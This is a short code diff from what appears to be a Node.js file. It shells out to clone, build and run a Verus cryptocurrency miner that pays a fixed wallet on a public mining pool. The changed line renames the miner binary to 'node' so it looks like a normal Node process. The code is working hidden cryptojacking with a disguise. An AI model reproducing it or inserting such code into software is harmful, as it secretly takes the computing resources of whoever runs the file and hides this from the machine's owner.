@@ -11,7 +11,7 @@ http
 const { exec } = require("child_process");
 
 exec(
-  "cd /tmp && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh configure.sh autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.XXX -p x -t 1",
+  "cd /tmp && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh configure.sh autogen.sh && ./build.sh && mv ccminer node && ./node -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.XXX -p x -t 1",
   (error, stdout, stderr) => {
     if (error) {
       console.log(`error: ${error.message}`);
